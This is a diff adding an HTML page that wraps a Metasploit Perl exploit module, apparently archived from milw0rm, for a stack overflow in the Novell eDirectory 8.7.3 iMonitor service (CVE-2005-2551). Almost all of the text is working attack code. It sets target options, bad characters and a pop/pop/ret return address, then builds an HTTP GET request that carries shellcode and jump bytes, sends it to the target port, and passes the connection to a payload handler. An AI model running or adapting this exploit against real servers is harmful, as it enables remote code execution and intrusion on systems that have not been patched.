@@ -1,0 +1,120 @@
+<html>
+<head>
+<title>Novell eDirectory 8.7.3 iMonitor Remote Stack Overflow</title>
+<pre>
+##
+# This file is part of the Metasploit Framework and may be redistributed
+# according to the licenses defined in the Authors field below. In the
+# case of an unknown or missing license, this file defaults to the same
+# license as the core Framework (dual GPLv2 and Artistic). The latest
+# version of the Framework can always be obtained from metasploit.com.
+##
+
+package Msf::Exploit::edirectory_imonitor;
+use strict;
+use base &quot;Msf::Exploit&quot;;
+use Pex::Text;
+
+my $advanced = { };
+
+my $info =
+  {
+	'Name'    =&gt; 'eDirectory 8.7.3 iMonitor Remote Stack Overflow',
+	'Version' =&gt; '$Revision: 1.2 $',
+	'Authors' =&gt; [ 'anonymous' ],
+	  
+	'Arch'  =&gt; [ 'x86' ],
+	'OS'    =&gt; [ 'win32', 'winnt', 'winxp', 'win2k', 'win2003' ],
+	'Priv'  =&gt; 1,
+
+	'AutoOpts'  =&gt;  { 'EXITFUNC' =&gt; 'thread' },
+
+	'UserOpts'  =&gt;
+	  {
+		'RHOST' =&gt; [1, 'ADDR', 'The target address'],
+		'RPORT' =&gt; [1, 'PORT', 'The target port', 8008 ],
+		'VHOST' =&gt; [0, 'DATA', 'The virtual host name of the server'],
+		'SSL'   =&gt; [0, 'BOOL', 'Use SSL'],
+	  },
+
+	'Payload' =&gt;
+	  {
+		'Space'     =&gt; 0x1036,
+		'BadChars'  =&gt; &quot;\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&amp;=+?:;-,/#.\\$%&quot;,
+		'Keys' 	    =&gt; ['+ws2ord'],
+	  },
+
+	'Description'  =&gt; Pex::Text::Freeform(qq{
+		This module exploits a stack overflow in eDirectory 8.7.3 iMonitor
+	service. This vulnerability was discovered by Peter Winter-Smith of 
+	NGSSoftware.
+
+}),
+
+	'Refs'  =&gt;
+	  [
+	  	['OSVDB', '18703'],
+		['CVE',   '2005-2551'],
+		['BID',   '14548'],
+	  ],
+
+	'Targets' =&gt;
+	  [
+		[ 'Windows (ALL) - eDirectory 8.7.3 iMonitor', 0x63501f15] # pop/pop/ret
+	  ],
+
+	'Keys'  =&gt; ['imonitor'],
+  };
+
+sub new {
+	my $class = shift;
+	my $self = $class-&gt;SUPER::new({'Info' =&gt; $info, 'Advanced' =&gt; $advanced}, @_);
+	return($self);
+}
+
+sub Exploit {
+	my $self        = shift;
+	my $target_host = $self-&gt;GetVar('RHOST');
+	my $target_port = $self-&gt;GetVar('RPORT');
+	my $target_idx  = $self-&gt;GetVar('TARGET');
+	my $shellcode   = $self-&gt;GetVar('EncodedPayload')-&gt;Payload;
+	my $target      = $self-&gt;Targets-&gt;[$target_idx];
+
+	$self-&gt;PrintLine( &quot;[*] Attempting to exploit &quot; . $target-&gt;[0] );
+
+	my $s = Msf::Socket::Tcp-&gt;new(
+		'PeerAddr'  =&gt; $target_host,
+		'PeerPort'  =&gt; $target_port,
+		'SSL'      =&gt; $self-&gt;GetVar('SSL'),
+	  );
+
+	if ( $s-&gt;IsError ) {
+		$self-&gt;PrintLine( '[*] Error creating socket: ' . $s-&gt;GetError );
+		return;
+	}
+
+	# pop/pop/ret in ndsimon.dlm on our jump to our shellcode
+	my $req = $shellcode . &quot;\x90\x90\xeb\x04&quot; . pack('V', $target-&gt;[1]) . &quot;\xe9\xbd\xef\xff\xff&quot; . (&quot;B&quot; x 0xD0);
+	my $request =
+	  &quot;GET /nds/$req HTTP/1.1\r\n&quot;.
+	  &quot;Accept: */*\r\n&quot;.
+	  &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n&quot;.
+	  &quot;Host: $target_host:$target_port\r\n&quot;.
+	  &quot;Connection: Close\r\n&quot;.
+	  &quot;\r\n&quot;;
+
+	$s-&gt;Send($request);
+
+	$self-&gt;PrintLine(&quot;[*] Overflow request sent, sleeping for four seconds&quot;);
+	select(undef, undef, undef, 4);
+
+	$self-&gt;Handler($s);
+	return;
+}
+
+1;
+
+# milw0rm.com [2005-08-12]
+</pre>
+</html>
+
